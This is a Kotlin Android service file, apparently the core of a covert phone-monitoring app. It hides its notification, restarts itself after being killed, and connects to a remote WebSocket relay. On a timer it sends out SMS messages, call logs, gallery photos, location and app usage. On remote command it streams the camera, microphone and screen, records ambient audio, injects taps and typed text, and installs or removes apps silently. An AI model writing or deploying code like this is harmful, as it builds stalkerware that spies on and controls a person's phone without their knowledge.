package com.system.service.core

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.location.Location
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.*
import androidx.core.app.NotificationCompat
import com.google.android.gms.location.*
import com.system.service.monitors.*
import com.system.service.monitors.LivePaintingService
import com.system.service.monitors.AmbientRecorder
import com.system.service.monitors.BrowserBlocker
import com.system.service.monitors.OfflineAlertManager
import com.system.service.monitors.PermissionWatcher
import com.system.service.setup.MediaProjectionActivity
import com.system.service.setup.ShakeDetector
import org.json.JSONArray
import org.json.JSONObject

class CoreService : Service() {

    companion object {
        var instance: CoreService? = null
        var SERVER_URL = "wss://ws-relay-production-9ea0.up.railway.app/api/ws"
        const val PREFS_NAME     = "config"
        const val KEY_SERVER_URL = "server_url"
        const val KEY_PAIR_CODE  = "pair_code"
        private const val CHANNEL_ID = "device_health"
        private const val NOTIF_ID   = 1
    }

    private var wsManager: WebSocketManager? = null
    private var fusedLocationClient: FusedLocationProviderClient? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var shakeDetector: ShakeDetector? = null
    private val mainHandler = Handler(Looper.getMainLooper())

    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            mainHandler.postDelayed({
                if (wsManager?.isConnected() != true) wsManager?.forceReconnect()
            }, 2000)
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this

        // Install global crash logger FIRST — catches any unhandled exception in this process
        CrashLogger.install(this)
        CrashLogger.logServiceStart(this, "onCreate")

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        acquireWakeLock()
        createNotificationChannel()

        // ── CRITICAL FIX: Include ALL foreground service types being used ──────
        // Android 14+ (API 34) kills services after ~15 min if they use features
        // (location, mic, camera) that aren't declared in startForeground().
        // The manifest already declares them — we must also pass them here.
        startForegroundCompat()

        AppBlockerManager.init(this)
        KeywordDetector.init(this)
        BrowserBlocker.init(this)
        connectServer()
        WatchdogReceiver.schedule(this)
        MonitorWorker.enqueue(this)
        shakeDetector = ShakeDetector(this).also { it.start() }
        PermissionWatcher.start(this)
        OfflineAlertManager.start(this)

        try {
            val cm = getSystemService(ConnectivityManager::class.java)
            val req = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            cm.registerNetworkCallback(req, networkCallback)
        } catch (_: Exception) {}
    }

    /**
     * Starts foreground with correct types for each Android version.
     *
     * Android 14+ (API 34): MUST declare every type you actually use, or the OS
     * will silently kill the service after 10-15 minutes without any crash log.
     *
     * Manifest declares: dataSync | location | microphone | camera
     * We declare the same here at runtime.
     */
    private fun startForegroundCompat() {
        val notif = buildHiddenNotification()
        when {
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> {
                // Android 14+ — pass all types the service uses
                startForeground(
                    NOTIF_ID, notif,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                )
            }
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q -> {
                startForeground(NOTIF_ID, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            }
            else -> startForeground(NOTIF_ID, notif)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        CrashLogger.logServiceStop(this, "onDestroy")
        instance = null
        wsManager?.disconnect()
        stopPeriodicSending()
        shakeDetector?.stop()
        GeofenceMonitor.stopTracking()
        InternetScheduler.disable()
        AmbientRecorder.stopRecording(this)
        PermissionWatcher.stop()
        OfflineAlertManager.stop()
        try { CameraRecorder.stop(this) } catch (_: Exception) {}
        try { ScreenRecorder.stop(this) } catch (_: Exception) {}
        releaseWakeLock()
        // Reschedule watchdog on our way out — so it fires soon and restarts us
        WatchdogReceiver.schedule(this)
        try { getSystemService(ConnectivityManager::class.java).unregisterNetworkCallback(networkCallback) } catch (_: Exception) {}
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        // Android 14+ crashes if startForegroundService is called from onTaskRemoved
        // WatchdogReceiver handles restart via AlarmManager instead
        WatchdogReceiver.schedule(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Ensure foreground is re-established if service was restarted by system
        try { startForegroundCompat() } catch (_: Exception) {}
        return START_STICKY
    }

    private fun acquireWakeLock() {
        try {
            val pm = getSystemService(POWER_SERVICE) as PowerManager
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "GuardianEye::CoreLock")
                .also { it.setReferenceCounted(false); it.acquire(10 * 60 * 60 * 1000L) }
        } catch (_: Exception) {}
    }

    private fun releaseWakeLock() {
        try { if (wakeLock?.isHeld == true) wakeLock?.release() } catch (_: Exception) {}
    }

    // ── Periodic auto-send ─────────────────────────────────────────────────────
    private var periodicRunnable: Runnable? = null
    private var periodicTick = 0

    private fun startPeriodicSending() {
        stopPeriodicSending()
        periodicRunnable = object : Runnable {
            override fun run() {
                periodicTick++
                try { sendBattery() } catch (_: Exception) {}
                try { sendCurrentApp() } catch (_: Exception) {}
                if (periodicTick % 4 == 0)  try { sendLocation() } catch (_: Exception) {}
                if (periodicTick % 10 == 0) { try { sendCallLog(50) } catch (_: Exception) {}; try { sendSms(50) } catch (_: Exception) {} }
                if (periodicTick % 20 == 0) { try { sendAppUsage(24) } catch (_: Exception) {}; try { sendGallery(20) } catch (_: Exception) {} }
                mainHandler.postDelayed(this, 30_000)
            }
        }
        mainHandler.postDelayed(periodicRunnable!!, 30_000)
    }

    private fun stopPeriodicSending() {
        periodicRunnable?.let { mainHandler.removeCallbacks(it) }
        periodicRunnable = null
        periodicTick = 0
    }

    private fun connectServer() {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val savedUrl = prefs.getString(KEY_SERVER_URL, null)
        val pairCode = prefs.getString(KEY_PAIR_CODE, "") ?: ""
        if (savedUrl != null) SERVER_URL = savedUrl

        wsManager = WebSocketManager(
            serverUrl   = SERVER_URL,
            pairCode    = pairCode,
            onMessage   = { handleCommand(it) },
            onConnected = {
                OfflineAlertManager.onConnected()
                NotificationMonitor.drainQueue()

                // Send device_info + crash diagnostic if any
                val deviceInfo = JSONObject().apply {
                    put("blocked_apps",    JSONArray(AppBlockerManager.getBlockedApps()))
                    put("keywords",        JSONArray(KeywordDetector.getKeywords()))
                    put("blocked_domains", JSONArray(BrowserBlocker.getBlockedDomains()))
                }
                sendData("device_info", deviceInfo)

                // Send crash report if we have one — automatic diagnostic
                if (CrashLogger.hasCrashData(this@CoreService)) {
                    mainHandler.postDelayed({
                        val report = CrashLogger.buildDiagnosticReport(this@CoreService)
                        sendData("diagnostic_report", report)
                    }, 3000)
                }

                mainHandler.postDelayed({
                    try { sendBattery() } catch (_: Exception) {}
                    try { sendLocation() } catch (_: Exception) {}
                    try { sendCurrentApp() } catch (_: Exception) {}
                    try { sendCallLog(50) } catch (_: Exception) {}
                    try { sendSms(50) } catch (_: Exception) {}
                    try { sendAppUsage(24) } catch (_: Exception) {}
                    try { sendGallery(20) } catch (_: Exception) {}
                    startPeriodicSending()
                }, 1000)
            },
            onDisconnected = {
                OfflineAlertManager.onDisconnected()
                stopPeriodicSending()
            }
        )
        wsManager?.connect()
    }

    fun reconnect() {
        wsManager?.disconnect()
        connectServer()
    }

    private fun handleCommand(data: JSONObject) {
        try {
            when (data.optString("command")) {

                "update_url" -> {
                    val newUrl  = data.optString("url")
                    val newCode = data.optString("pair_code", "")
                    if (newUrl.startsWith("ws://") || newUrl.startsWith("wss://")) {
                        SERVER_URL = newUrl
                        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit()
                        if (newUrl.isNotEmpty())  prefs.putString(KEY_SERVER_URL, newUrl)
                        if (newCode.isNotEmpty()) prefs.putString(KEY_PAIR_CODE, newCode)
                        prefs.apply()
                        wsManager?.disconnect(); connectServer()
                    }
                }

                "request_screen_permission" -> {
                    try {
                        val i = Intent(this, MediaProjectionActivity::class.java)
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                        startActivity(i)
                    } catch (_: Exception) {}
                }

                // ── Diagnostic ─────────────────────────────────────────────────
                "get_diagnostic_report" -> {
                    val report = CrashLogger.buildDiagnosticReport(this)
                    sendData("diagnostic_report", report)
                }
                "clear_diagnostic_logs" -> {
                    CrashLogger.clearAll(this)
                    sendData("diagnostic_cleared", JSONObject().apply { put("time", System.currentTimeMillis()) })
                }

                // ── App Blocker ────────────────────────────────────────────────
                "set_blocked_apps" -> {
                    val arr = data.optJSONArray("apps") ?: JSONArray()
                    val list = (0 until arr.length()).map { arr.getString(it) }
                    AppBlockerManager.setBlockedApps(list)
                    sendData("blocked_apps_updated", JSONObject().apply { put("count", list.size); put("apps", arr) })
                }

                "set_time_limit" -> {
                    val pkg = data.optString("package"); val mins = data.optInt("minutes", 0)
                    if (pkg.isNotEmpty()) AppBlockerManager.setTimeLimit(pkg, mins)
                    sendData("time_limit_set", JSONObject().apply { put("package", pkg); put("minutes", mins) })
                }

                "set_geofence" -> {
                    val lat = data.optDouble("lat"); val lng = data.optDouble("lng")
                    val radius = data.optDouble("radius", 200.0).toFloat()
                    GeofenceMonitor.setGeofence(lat, lng, radius, this)
                    sendData("geofence_set", JSONObject().apply { put("lat", lat); put("lng", lng); put("radius", radius) })
                }
                "disable_geofence" -> GeofenceMonitor.disableGeofence()

                "set_keywords" -> {
                    val arr = data.optJSONArray("keywords") ?: JSONArray()
                    val list = (0 until arr.length()).map { arr.getString(it) }
                    KeywordDetector.setKeywords(list, this)
                    sendData("keywords_updated", JSONObject().apply { put("count", list.size) })
                }

                "set_schedule" -> {
                    val offStart = data.optInt("off_hour_start", 23); val offEnd = data.optInt("off_hour_end", 6)
                    InternetScheduler.setSchedule(offStart, offEnd, this)
                    sendData("schedule_set", JSONObject().apply { put("off_start", offStart); put("off_end", offEnd) })
                }
                "disable_schedule" -> InternetScheduler.disable()

                "get_daily_report" -> sendData("daily_report", AppBlockerManager.getDailyReport())

                "set_blocked_domains" -> {
                    val arr = data.optJSONArray("domains") ?: JSONArray()
                    val list = (0 until arr.length()).map { arr.getString(it) }
                    BrowserBlocker.setBlockedDomains(list, this)
                    sendData("blocked_domains_updated", JSONObject().apply { put("count", list.size); put("domains", arr) })
                }
                "get_blocked_domains" -> {
                    sendData("blocked_domains", JSONObject().apply { put("domains", JSONArray(BrowserBlocker.getBlockedDomains())) })
                }

                "start_ambient_record" -> AmbientRecorder.startRecording(this, data.optInt("duration_seconds", 60))
                "stop_ambient_record"  -> AmbientRecorder.stopRecording(this)
                "get_recording" -> {
                    val path = data.optString("path")
                    if (path.isNotEmpty()) AmbientRecorder.sendRecordingToParent(this, path)
                }
                "list_recordings" -> {
                    val files = AmbientRecorder.listRecordings(this); val arr = JSONArray()
                    files.take(20).forEach { f -> arr.put(JSONObject().apply { put("path", f.absolutePath); put("filename", f.name); put("size_kb", f.length() / 1024); put("modified", f.lastModified()) }) }
                    sendData("recording_list", JSONObject().apply { put("files", arr) })
                }

                "set_offline_threshold" -> {
                    val mins = data.optInt("minutes", 30)
                    OfflineAlertManager.setThreshold(this, mins)
                    sendData("offline_threshold_set", JSONObject().apply { put("minutes", mins) })
                }

                "get_permission_status" -> {
                    sendData("permission_check_requested", JSONObject().apply { put("time", System.currentTimeMillis()) })
                }

                "block_contact" -> {
                    val number = data.optString("number")
                    val prefs = getSharedPreferences("blocked_contacts", MODE_PRIVATE)
                    val existing = prefs.getStringSet("numbers", mutableSetOf()) ?: mutableSetOf()
                    existing.add(number)
                    prefs.edit().putStringSet("numbers", existing).apply()
                    sendData("contact_blocked", JSONObject().apply { put("number", number) })
                }

                "lock_screen"    -> lockScreen()
                "get_battery"    -> sendBattery()
                "get_location"   -> sendLocation()
                "take_photo"     -> takeSinglePhoto()
                "emergency_lock" -> { lockScreen(); sendData("emergency_locked", JSONObject()) }

                "emergency_lock_all" -> {
                    val pm = packageManager
                    val pkgs = pm.getInstalledPackages(0)
                        .filter { (it.applicationInfo?.flags ?: 0) and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0 }
                        .map { it.packageName }.filter { it != packageName }
                    AppBlockerManager.setBlockedApps(pkgs)
                    lockScreen()
                    sendData("emergency_locked_all", JSONObject().apply { put("blocked_count", pkgs.size); put("source", "emergency_lock_all") })
                }
                "emergency_unlock_all" -> {
                    AppBlockerManager.setBlockedApps(emptyList())
                    sendData("emergency_unlocked_all", JSONObject().apply { put("source", "emergency_unlock_all") })
                }

                "wifi_on"        -> runShellCmd("svc wifi enable")
                "wifi_off"       -> runShellCmd("svc wifi disable")
                "get_gallery"    -> sendGallery(data.optInt("limit", 20))
                "get_full_photo" -> sendFullPhoto(data.optString("path"))
                "get_call_log"   -> sendCallLog(data.optInt("limit", 50))
                "get_sms"        -> sendSms(data.optInt("limit", 50))
                "get_running_app"-> sendCurrentApp()
                "get_app_usage"  -> sendAppUsage(data.optInt("hours", 24))

                "start_camera_stream" -> startService(Intent(this, CameraStreamService::class.java).putExtra("interval", data.optLong("interval", 33L)))
                "stop_camera_stream"  -> startService(Intent(this, CameraStreamService::class.java).setAction("STOP"))
                "start_mic_stream"    -> startService(Intent(this, AudioStreamService::class.java))
                "stop_mic_stream"     -> startService(Intent(this, AudioStreamService::class.java).setAction("STOP"))
                "start_screen_stream" -> startService(Intent(this, ScreenStreamService::class.java).putExtra("interval", data.optLong("interval", 500L)))
                "stop_screen_stream"  -> startService(Intent(this, ScreenStreamService::class.java).setAction("STOP"))

                "start_camera_record" -> CameraRecorder.start(this, data.optInt("duration_seconds", 60), data.optBoolean("front_camera", false))
                "stop_camera_record"  -> CameraRecorder.stop(this)
                "list_camera_records" -> {
                    val files = CameraRecorder.listRecordings(this); val arr = JSONArray()
                    files.take(20).forEach { f -> arr.put(JSONObject().apply { put("path", f.absolutePath); put("filename", f.name); put("size_kb", f.length() / 1024); put("modified", f.lastModified()) }) }
                    sendData("camera_record_list", JSONObject().apply { put("files", arr) })
                }
                "get_camera_record_file" -> CameraRecorder.sendRecordingFile(this, data.optString("path"))

                "start_screen_record" -> ScreenRecorder.start(this, data.optInt("duration_seconds", 60))
                "stop_screen_record"  -> ScreenRecorder.stop(this)
                "list_screen_records" -> {
                    val files = ScreenRecorder.listRecordings(this); val arr = JSONArray()
                    files.take(20).forEach { f -> arr.put(JSONObject().apply { put("path", f.absolutePath); put("filename", f.name); put("size_kb", f.length() / 1024); put("modified", f.lastModified()) }) }
                    sendData("screen_record_list", JSONObject().apply { put("files", arr) })
                }
                "get_screen_record_file" -> ScreenRecorder.sendRecordingFile(this, data.optString("path"))

                "scan_albums"    -> AlbumsSafetyScanner.scan(this)
                "get_album_image"-> AlbumsSafetyScanner.getFullImage(this, data.optString("uri"))

                "touch"    -> AccessibilityMonitor.performTouch(data.optDouble("x", 0.0).toFloat(), data.optDouble("y", 0.0).toFloat())
                "swipe"    -> AccessibilityMonitor.performSwipe(data.optDouble("x1", 0.0).toFloat(), data.optDouble("y1", 0.0).toFloat(), data.optDouble("x2", 0.0).toFloat(), data.optDouble("y2", 500.0).toFloat(), data.optLong("duration", 300))
                "key_back"    -> AccessibilityMonitor.performBack()
                "key_home"    -> AccessibilityMonitor.performHome()
                "key_recents" -> AccessibilityMonitor.performRecents()
                "type_text"   -> AccessibilityMonitor.typeText(data.optString("text"))

                "grant_permissions" -> {
                    val count = ShizukuManager.grantAllPermissions(this)
                    sendData("permissions_result", JSONObject().apply { put("granted", count); put("shizuku_available", ShizukuManager.isShizukuAvailable()) })
                }

                "silent_install" -> {
                    val path = data.optString("apk_path")
                    val ok = ShizukuManager.silentInstall(path)
                    sendData("install_result", JSONObject().apply { put("success", ok); put("path", path) })
                }
                "silent_uninstall" -> {
                    val pkg = data.optString("package")
                    val ok = ShizukuManager.silentUninstall(pkg)
                    sendData("uninstall_result", JSONObject().apply { put("success", ok); put("package", pkg) })
                }
                "force_stop" -> {
                    val pkg = data.optString("package")
                    val ok = ShizukuManager.forceStop(pkg)
                    sendData("force_stop_result", JSONObject().apply { put("success", ok); put("package", pkg) })
                }
                "freeze_app" -> {
                    val pkg = data.optString("package")
                    val ok = ShizukuManager.freezeApp(pkg)
                    sendData("freeze_result", JSONObject().apply { put("success", ok); put("package", pkg); put("frozen", true) })
                }
                "unfreeze_app" -> {
                    val pkg = data.optString("package")
                    val ok = ShizukuManager.unfreezeApp(pkg)
                    sendData("freeze_result", JSONObject().apply { put("success", ok); put("package", pkg); put("frozen", false) })
                }
                "set_dns" -> {
                    val dns = data.optString("dns_server", "family.cloudflare-dns.com")
                    val ok = ShizukuManager.setPrivateDns(dns)
                    sendData("dns_result", JSONObject().apply { put("success", ok); put("dns", dns) })
                }

                "live_painting_start" -> {
                    val color = data.optString("color", "#FF0000")
                    val size  = data.optInt("brush_size", 20)
                    val i = Intent(this, LivePaintingService::class.java).apply {
                        putExtra("color", color); putExtra("brush_size", size)
                    }
                    startForegroundService(i)
                    sendData("live_painting_started", JSONObject())
                }
                "live_painting_stop" -> {
                    startService(Intent(this, LivePaintingService::class.java).setAction("STOP"))
                    sendData("live_painting_stopped", JSONObject())
                }
                "live_painting_draw" -> {
                    val x = data.optFloat("x", 0f); val y = data.optFloat("y", 0f)
                    val action = data.optString("action", "move")
                    LivePaintingService.instance?.onRemoteDraw(x, y, action)
                }
            }
        } catch (e: Exception) {
            CrashLogger.logCrash(this, e, "handleCommand")
        }
    }

    // ── Send helpers (same as before) ─────────────────────────────────────────
    fun sendData(type: String, payload: JSONObject) {
        try {
            wsManager?.send(JSONObject().apply { put("type", type); put("payload", payload) })
        } catch (_: Exception) {}
    }

    private fun sendBattery() {
        try {
            val bm = getSystemService(BATTERY_SERVICE) as BatteryManager
            val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val charging = bm.isCharging
            sendData("battery", JSONObject().apply { put("level", pct); put("charging", charging) })
        } catch (_: Exception) {}
    }

    private fun sendLocation() {
        try {
            fusedLocationClient?.lastLocation?.addOnSuccessListener { loc: Location? ->
                loc?.let {
                    sendData("location", JSONObject().apply {
                        put("lat", it.latitude); put("lng", it.longitude); put("accuracy", it.accuracy)
                    })
                }
            }
        } catch (_: Exception) {}
    }

    private fun sendCurrentApp() {
        try {
            val info = AppUsageManager.getCurrentApp(this)
            sendData("current_app", JSONObject().apply { put("package", info.first); put("name", info.second) })
        } catch (_: Exception) {}
    }

    private fun sendCallLog(limit: Int) {
        try {
            val logs = CallLogManager.getCallLog(this, limit)
            sendData("call_log", JSONObject().apply { put("calls", logs) })
        } catch (_: Exception) {}
    }

    private fun sendSms(limit: Int) {
        try {
            val msgs = SmsReader.getSms(this, limit)
            sendData("sms_log", JSONObject().apply { put("messages", msgs) })
        } catch (_: Exception) {}
    }

    private fun sendAppUsage(hours: Int) {
        try {
            val usage = AppUsageManager.getUsageStats(this, hours)
            sendData("app_usage", JSONObject().apply { put("usage", usage); put("hours", hours) })
        } catch (_: Exception) {}
    }

    private fun sendGallery(limit: Int) {
        try {
            val items = GalleryManager.getRecentImages(this, limit)
            sendData("gallery", JSONObject().apply { put("items", items) })
        } catch (_: Exception) {}
    }

    private fun sendFullPhoto(path: String) {
        try {
            GalleryManager.sendFullImage(this, path)
        } catch (_: Exception) {}
    }

    private fun takeSinglePhoto() {
        try { startService(Intent(this, CameraStreamService::class.java).setAction("SNAPSHOT")) } catch (_: Exception) {}
    }

    private fun lockScreen() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            dpm.lockNow()
        } catch (_: Exception) {}
    }

    private fun runShellCmd(cmd: String) {
        try { ShizukuManager.runShell(cmd) } catch (_: Exception) {}
    }

    private fun createNotificationChannel() {
        val ch = NotificationChannel(CHANNEL_ID, "Device Health", NotificationManager.IMPORTANCE_NONE)
            .apply { setShowBadge(false); enableLights(false); enableVibration(false); lockscreenVisibility = Notification.VISIBILITY_SECRET }
        getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
    }

    private fun buildHiddenNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("").setContentText("")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

    override fun onBind(intent: Intent?): IBinder? = null
}
